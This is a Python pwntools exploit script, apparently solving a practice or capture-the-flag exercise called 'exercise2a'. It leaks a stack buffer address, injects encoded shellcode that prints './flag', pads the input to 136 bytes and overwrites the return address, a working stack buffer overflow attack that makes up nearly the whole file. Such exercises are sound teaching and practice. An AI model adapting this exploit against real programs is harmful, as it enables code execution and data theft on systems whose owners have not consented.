#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise2a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x4011fb
b *0x401205
b *0x401216
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
#ret = 0x7fffffffde30
#ret2 = 0x7fffffffded0
#ret3 = 0x7fffffffdef0
#nops = 0x9090909090909090
sh = encoders.encoder.encode(asm(shellcraft.amd64.linux.cat("./flag", fd=1)), {'\x00','\x01'})
#shellcode = b'\x90'*128 + p64(nops) + p64(ret3) + p64(ret3) + p64(nops) + sh
#shellcode = b'\x90'*128 + b'\x41'*8 + p64(ret2) + p64(ret2) + b'B'*8 + b'\xcc'*80

r = start()
buf = r.recv(numb=14)
buf_str = buf[2:]
buf_addr = int(buf_str, 16)
shellcode = sh + b'A'*(136 - len(sh)) + p64(buf_addr)
r.recvuntil(b"password:\n")
r.sendline(shellcode)
print(r.recvall().decode().split('\n')[1])

# You can now communicate with the process, e.g.,
# r.sendline("AAAAA")
# r.recvline()

